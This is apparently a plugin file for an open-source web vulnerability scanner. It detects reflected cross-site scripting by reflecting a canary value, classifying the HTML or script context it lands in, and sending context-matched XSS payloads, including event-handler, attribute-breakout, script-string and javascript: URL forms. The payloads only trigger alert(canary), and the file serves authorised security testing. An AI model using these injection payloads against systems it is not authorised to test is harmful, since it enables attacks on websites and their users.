/* ---
id: xss-reflected-basic
name: Reflected XSS (basic contexts)
description: Detects reflected XSS via canary reflection in executable HTML contexts with control comparison.
author: GASH contributors
severity: high
tags: [xss, client]
safe: false
deep: false
active: true
requires_auth: false
phase: probe
order: 40
api_version: "1.0"
tests: tests/fixtures/xss-reflected-basic/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xss/xss-reflected-basic.js
// What: Tier 2 reflected-XSS plugin with probe-first context classification.
// Why: This is an active probe. A random identifier only proves reflection;
//   the harmless alert(canary) payload is required for an XSS execution claim.
//   The whole payload corpus is alert-based so the headless dialog listener
//   can confirm under --browser-verify; without a browser the finding
//   honestly caps at static-execution-evidence.
//
// Strategy: send the bare canary first (one request), classify the response
// context around the reflection (HTML text, attribute with its quote style,
// event-handler attribute, script-string with its quote style, URL), then
// send only the payload family that can execute in that context. The oracle
// re-derives the context independently and stays the evidence authority; a
// wrong client-side guess costs one probe, never a false claim.

// classifyContext inspects the bytes around the first canary occurrence and
// returns a coarse context label. It is a heuristic used only for payload
// selection, never for evidence.
function classifyContext(body, canary) {
  const idx = body.indexOf(canary);
  if (idx < 0) {
    return "none";
  }
  const before = body.slice(0, idx);
  const lt = before.lastIndexOf("<");
  const gt = before.lastIndexOf(">");
  const openScript = before.lastIndexOf("<script");
  const closeScript = before.lastIndexOf("</script");
  if (before.lastIndexOf("<!--") > lt) {
    return "comment";
  }
  const inScriptElem = openScript > closeScript;
  const inScriptAttrs = inScriptElem && openScript === lt && lt > gt;
  const inAttrRegion = inScriptAttrs || (lt > gt && !inScriptElem);
  if (inAttrRegion) {
    const tagContent = before.slice(lt + 1);
    const m = /([a-zA-Z_:][\-a-zA-Z0-9_:.]*)\s*=\s*(["']?)\s*$/.exec(tagContent);
    if (m) {
      const name = m[1].toLowerCase();
      if (name.indexOf("on") === 0) {
        return "attr-executable";
      }
      if (["href", "src", "action", "formaction", "xlink:href"].indexOf(name) !== -1) {
        return "url";
      }
      if (m[2] === '"') {
        return "attr-double";
      }
      if (m[2] === "'") {
        return "attr-single";
      }
      return "attr-unquoted";
    }
    return "attr-unquoted";
  }
  if (inScriptElem) {
    const text = before.slice(openScript);
    let state = "code";
    let quote = "";
    for (let i = 0; i < text.length; i++) {
      const ch = text[i];
      if (state === "line") {
        if (ch === "\n" || ch === "\r") {
          state = "code";
        }
        continue;
      }
      if (state === "block") {
        if (ch === "*" && text[i + 1] === "/") {
          state = "code";
          i++;
        }
        continue;
      }
      if (quote) {
        if (ch === "\\") {
          i++;
          continue;
        }
        if (ch === quote) {
          quote = "";
        }
        continue;
      }
      if (ch === "/" && text[i + 1] === "/") {
        state = "line";
        i++;
        continue;
      }
      if (ch === "/" && text[i + 1] === "*") {
        state = "block";
        i++;
        continue;
      }
      if (ch === "'" || ch === '"' || ch === "`") {
        quote = ch;
      }
    }
    const endScript = body.slice(idx + canary.length, idx + canary.length + 2);
    if (state === "line" || state === "block" || endScript === "//") {
      return "script-comment";
    }
    if (quote === "'") {
      return "script-single";
    }
    if (quote === '"') {
      return "script-double";
    }
    if (quote === "`") {
      return "script-template";
    }
    return "script";
  }
  return "html-text";
}

// payloadsFor returns the payload family for a classified context; every
// template is harmless (alert(canary) only, no data access, no persistence).
function payloadsFor(context, c) {
  switch (context) {
    case "html-text":
      return [
        "<svg/onload=alert(" + c + ")>",
        "<img src=x onerror=alert(" + c + ")>",
        "<details open ontoggle=alert(" + c + ")>",
        "<sVg/oNloAd=alert(" + c + ")>"
      ];
    case "attr-double":
      return [
        '" autofocus onfocus=alert(' + c + ') x="',
        '"><svg/onload=alert(' + c + ')>',
        '" aUtOfOcUs OnFoCuS=alert(' + c + ') x="'
      ];
    case "attr-single":
      return [
        "' autofocus onfocus=alert(" + c + ") x='",
        "'><svg/onload=alert(" + c + ")>",
        "' aUtOfOcUs OnFoCuS=alert(" + c + ") x='"
      ];
    case "attr-unquoted":
      return [
        " onmouseover=alert(" + c + ") x=",
        " autofocus onfocus=alert(" + c + ")",
        " onmouseover=alert(" + c + ")//"
      ];
    case "attr-executable":
      return [
        "alert(" + c + ")",
        ";alert(" + c + ");",
        "alert(" + c + ")//"
      ];
    case "script-single":
    case "script":
      return [
        "'-alert(" + c + ")-'",
        "';alert(" + c + ")//",
        "</script><svg/onload=alert(" + c + ")>"
      ];
    case "script-double":
      return [
        '"-alert(' + c + ')-"',
        '";alert(' + c + ')//',
        "</script><svg/onload=alert(" + c + ")>"
      ];
    case "script-template":
      return [
        "`-alert(" + c + ")-`",
        "${alert(" + c + ")}",
        "</script><svg/onload=alert(" + c + ")>"
      ];
    case "url":
      return [
        "javascript:alert(" + c + ")",
        "JaVaScRiPt:alert(" + c + ")",
        "data:text/html,<script>alert(" + c + ")</script>"
      ];
    default:
      // Unknown/escaped marketing: try the highest-yield polyglot and
      // channel-crossing forms once each.
      return [
        '"><svg/onload=alert(' + c + ')>',
        "'><svg/onload=alert(" + c + ")>",
        "<svg/onload=alert(" + c + ")>",
        "'-alert(" + c + ")-'",
        "javascript:alert(" + c + ")"
      ];
  }
}

function run(probe, ctx) {
  const HOT_PARAMS = /^(id|name|q|query|search|page|file|path|url|redirect|ip|cmd|user|username|password|txtname|mtxmessage|cat|item|input)$/;
  const rank = (p) => {
    const loc = String(p.paramLocation || "");
    const hasQuery = String(p.url || "").includes("?");
    const hasValue = String(p.value || "") !== "";
    const hasForm = p.formValues && Object.keys(p.formValues).length > 0;
    const hot = HOT_PARAMS.test(String(p.paramName || "").toLowerCase());
    if (hasForm && (loc === "query" || loc === "body")) {
      return hot ? 0 : 1;
    }
    if (loc === "query" && hasQuery && hasValue) {
      return 2;
    }
    if (hasValue) {
      return 3;
    }
    if (loc === "query" || loc === "body") {
      return 4;
    }
    return 5;
  };
  const points = ctx.injectionPoints().filter((p) => {
    const name = String(p.paramName || "").toLowerCase();
    if (/^(submit|button|login|signin|reset|search-submit)$/.test(name)) {
      return false;
    }
    const path = String(p.url || "").toLowerCase().split("?")[0];
    return !/\.(css|js|mjs|map|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|webp)$/.test(path);
  }).sort((a, b) => rank(a) - rank(b));

  const candidates = [];
  const maxSends = 60; // request budget per run; corpus stays well under it
  let sends = 0;
  for (const point of points) {
    if (sends >= maxSends) {
      return candidates;
    }
    const canary = probe.canary();
    sends++;
    const markerResp = probe.send(point.withValue(canary));
    const context = classifyContext(markerResp.body, canary);
    if (context === "none" || context === "comment" || context === "script-comment") {
      continue; // canary never reflects / never executes: not worth a probe
    }
    for (const payload of payloadsFor(context, canary)) {
      if (sends >= maxSends) {
        return candidates;
      }
      sends++;
      const resp = probe.send(point.withValue(payload));
      const ev = host.oracles.reflection(resp, canary,
        ["html", "attr-executable", "script", "url", "url-executable"]);
      if (ev) {
        candidates.push(host.candidate(point.withValue(payload), "reflected-xss", ev));
        break;
      }
    }
  }
  return candidates;
}
